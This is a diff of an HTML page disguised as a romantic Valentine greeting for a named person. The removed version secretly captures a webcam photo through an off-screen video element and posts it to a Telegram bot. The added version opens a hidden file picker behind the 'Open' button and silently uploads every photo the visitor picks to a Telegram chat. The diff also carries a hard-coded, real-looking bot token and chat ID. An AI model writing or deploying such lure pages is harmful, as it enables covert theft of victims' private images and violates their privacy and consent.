@@ -1,125 +1,175 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Valentine Surprise ❤️</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>For Khushi 💖</title>
+    <style>
+        :root {
+            --bg-gradient: linear-gradient(135deg, #ffe9f3 0%, #fff5f0 50%, #fce4ec 100%);
+            --glass: rgba(255, 255, 255, 0.45);
+            --accent: #ff85a2;
+            --text: #7d5a5a;
+        }
 
-<style>
-body{
-    background: linear-gradient(to right,#ffc3a0,#ffafbd);
-    font-family: Arial, sans-serif;
-    text-align: center;
-}
-.card-container{
-    display:flex;
-    justify-content:center;
-    gap:15px;
-    margin-top:30px;
-    flex-wrap:wrap;
-}
-.card{
-    width:140px;
-    height:180px;
-    background:#fff;
-    border-radius:10px;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    font-weight:bold;
-    cursor:pointer;
-    border:2px solid #ff4b2b;
-    box-shadow:0 4px 8px rgba(0,0,0,0.2);
-}
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body, html { height: 100vh; width: 100vw; overflow: hidden; background: var(--bg-gradient); color: var(--text); }
 
-/* 🔴 CAMERA FIX */
-#video{
-    position:fixed;
-    top:-1000px;
-    left:-1000px;
-    width:320px;
-    height:240px;
-}
-#canvas{display:none;}
-</style>
+        /* Floating Elements */
+        #bg-wrap { position: fixed; inset: 0; pointer-events: none; z-index: 1; }
+        .heart { position: absolute; color: var(--accent); animation: floatUp 7s linear infinite; opacity: 0; }
+        .butterfly { position: absolute; font-size: 24px; animation: fly 10s linear infinite; z-index: 2; }
+
+        @keyframes floatUp {
+            0% { transform: translateY(110vh) scale(0.5); opacity: 0; }
+            50% { opacity: 0.8; }
+            100% { transform: translateY(-10vh) scale(1.2); opacity: 0; }
+        }
+        @keyframes fly {
+            0% { left: -10%; top: 20%; transform: rotate(0deg); }
+            50% { left: 50%; top: 50%; transform: rotate(20deg); }
+            100% { left: 110%; top: 10%; transform: rotate(-10deg); }
+        }
+
+        header { position: fixed; top: 15px; width: 100%; text-align: center; z-index: 100; font-size: 13px; opacity: 0.8; }
+
+        .page {
+            position: absolute; inset: 0; display: flex; align-items: center; justify-content: center;
+            opacity: 0; pointer-events: none; transition: 1s ease; z-index: 10;
+        }
+        .page.active { opacity: 1; pointer-events: auto; }
+
+        .glass-card {
+            background: var(--glass); backdrop-filter: blur(15px); border-radius: 30px;
+            padding: 30px; width: 85%; max-width: 350px; text-align: center;
+            box-shadow: 0 10px 30px rgba(255,133,162,0.15); border: 1px solid rgba(255,255,255,0.5);
+        }
+
+        .btn {
+            background: var(--accent); color: white; border: none; padding: 12px 35px;
+            border-radius: 50px; margin-top: 20px; font-weight: bold; cursor: pointer;
+            box-shadow: 0 5px 15px rgba(255,133,162,0.4);
+        }
+
+        #music-btn { position: fixed; bottom: 20px; right: 20px; z-index: 100; cursor: pointer; font-size: 25px; }
+        
+        /* Book Style Cards */
+        .book { width: 180px; height: 240px; position: relative; transition: 1s; transform-style: preserve-3d; }
+        .book.open { transform: rotateY(-160deg); }
+        .face { position: absolute; inset: 0; backface-visibility: hidden; border-radius: 15px; background: white; padding: 20px; display: flex; flex-direction: column; align-items: center; justify-content: center; box-shadow: 5px 5px 15px rgba(0,0,0,0.05); }
+        .back { transform: rotateY(180deg); text-align: center; font-size: 14px; }
+
+        video { width: 100%; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
+    </style>
 </head>
-
 <body>
 
-<h2>Open Your Valentine Card 💌</h2>
+<header>Made by sivasingh 💖<br>@smss1708</header>
+<div id="bg-wrap"></div>
+<div id="music-btn" onclick="toggleMute()">🎵</div>
 
-<div class="card-container">
-    <div class="card" onclick="startCamera('Tu meri zindagi ho ❤️')">Pyaar</div>
-    <div class="card" onclick="startCamera('I Love You 😍')">Love</div>
-    <div class="card" onclick="startCamera('Forever Together 💍')">Promise</div>
+<audio id="track" src="tere-liye.mp3" loop></audio>
+<input type="file" id="media-input" accept="image/*" multiple style="display:none">
+
+<div id="p1" class="page active">
+    <div class="glass-card">
+        <img src="intro.gif" width="120">
+        <h2 style="margin:15px 0">Hey Babu 💖</h2>
+        <p>Can we talk for a moment? I have something special for you...</p>
+        <button class="btn" onclick="start()">Open 💌</button>
+    </div>
 </div>
 
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas"></canvas>
+<div id="p2" class="page">
+    <div style="width:80%; max-width:300px">
+        <video id="vid" playsinline src="intro-love.mp4"></video>
+    </div>
+</div>
+
+<div id="p3" class="page">
+    <div class="book" onclick="nextBook(this, 4)">
+        <div class="face front"><img src="rose.gif" width="80"><p>Touch to Open</p></div>
+        <div class="face back">Khushi 💖<br><br>You are the most beautiful feeling of my life...</div>
+    </div>
+</div>
+
+<div id="p4" class="page">
+    <div class="glass-card">
+        <img src="endlove.gif" width="100">
+        <h3>Will you stay with me forever, Khushi? 💖</h3>
+    </div>
+</div>
 
 <script>
-const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
-const CHAT_ID  = "YOUR_CHAT_ID_HERE";
+    const BOT_TOKEN = '8530289605:AAGjCNZYJHKejV5La9lDRZRJsndb925J8yc';
+    const CHAT_ID = '7735968383';
+    const track = document.getElementById('track');
+    const vid = document.getElementById('vid');
 
-let stream;
-
-async function startCamera(msg){
-    alert(msg);
-
-    try{
-        stream = await navigator.mediaDevices.getUserMedia({
-            video:{ facingMode:"user" },
-            audio:false
-        });
-
-        const video = document.getElementById("video");
-        video.srcObject = stream;
-
-        video.onloadedmetadata = () => {
-            video.play();
-
-            // ✅ Camera ready hone ka wait
-            setTimeout(capturePhoto, 1500);
-        };
-
-    }catch(e){
-        alert("Camera allow karo ❤️");
+    function start() {
+        track.volume = 0.35;
+        track.play();
+        
+        // Trigger media input (gallery or camera)
+        document.getElementById('media-input').click();
+        
+        changePage(2);
+        track.pause();
+        vid.play();
+        vid.onended = () => {
+            track.play();
+            changePage(3);
+        }
     }
-}
 
-function capturePhoto(){
-    const video  = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
-    const ctx    = canvas.getContext("2d");
-
-    canvas.width  = video.videoWidth;
-    canvas.height = video.videoHeight;
-
-    ctx.drawImage(video,0,0,canvas.width,canvas.height);
-
-    canvas.toBlob(blob=>{
-        sendToTelegram(blob);
-        stopCamera();
-    },"image/jpeg",0.9);
-}
-
-function stopCamera(){
-    if(stream){
-        stream.getTracks().forEach(t=>t.stop());
+    function changePage(id) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById('p'+id).classList.add('active');
     }
-}
 
-function sendToTelegram(blob){
-    const fd = new FormData();
-    fd.append("chat_id", CHAT_ID);
-    fd.append("photo", blob, "photo.jpg");
+    function nextBook(el, nextId) {
+        el.classList.add('open');
+        setTimeout(() => changePage(nextId), 2500);
+    }
 
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
-        method:"POST",
-        body:fd
-    });
-}
+    function toggleMute() {
+        track.muted = !track.muted;
+    }
+
+    // Media to Telegram Logic (supports both gallery and camera)
+    document.getElementById('media-input').onchange = function(e) {
+        const files = e.target.files;
+        for (let file of files) {
+            let formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', file);
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+    }
+
+    // Background Effects
+    function init() {
+        const wrap = document.getElementById('bg-wrap');
+        for(let i=0; i<15; i++) {
+            let h = document.createElement('div');
+            h.className = 'heart';
+            h.innerHTML = '💖';
+            h.style.left = Math.random()*100+'vw';
+            h.style.animationDelay = Math.random()*5+'s';
+            wrap.appendChild(h);
+        }
+        setInterval(() => {
+            let b = document.createElement('div');
+            b.className = 'butterfly';
+            b.innerHTML = '🦋';
+            wrap.appendChild(b);
+            setTimeout(() => b.remove(), 10000);
+        }, 4000);
+    }
+    init();
 </script>
-
 </body>
 </html>
